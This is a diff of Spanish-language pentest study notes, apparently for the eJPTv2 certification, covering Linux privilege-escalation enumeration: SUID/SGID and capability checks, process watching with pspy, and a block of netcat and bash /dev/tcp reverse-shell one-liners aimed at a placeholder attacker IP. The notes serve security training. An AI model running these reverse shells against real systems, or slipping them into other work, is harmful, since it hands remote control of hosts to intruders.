@@ -3,7 +3,6 @@
 ---
 
 ------
-
 ## Enumeración una vez ganamos acceso para elevar privilegios
 
 > Webs
@@ -14,7 +13,7 @@
 
 
 > Tools
--  [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
+- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
 - [PSPY](https://github.com/DominicBreuker/pspy)
 
 > Commands Para **SUID** para **SGID**
@@ -35,7 +34,7 @@ getcap -r / 2>/dev/null
 
 >Ver que tarea se ejecuta
 
-- [PSPY](https://github.com/DominicBreuker/pspy)
+- [PSPY](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)
 
 ```bash
 systemctl list-timers
@@ -45,7 +44,7 @@ systemctl list-timers
 
 ```bash
 ps -eo command
-ps -eo user command
+ps -eo user,command
 ```
 
 - Script --> [**currentcommand.sh**](D:\Training\eJPTv2\Payloads\currentcommandSystem.sh)
@@ -88,9 +87,9 @@ done
 ```bash
  nc -e /bin/bash ip_atacante 8080
  
- bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
-`bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"`
- bash -i >& /dev/tcp/ip_atacante/port 0>&1
+bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
+bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"
+bash -i >& /dev/tcp/ip_atacante/port 0>&1
 ```
 
 
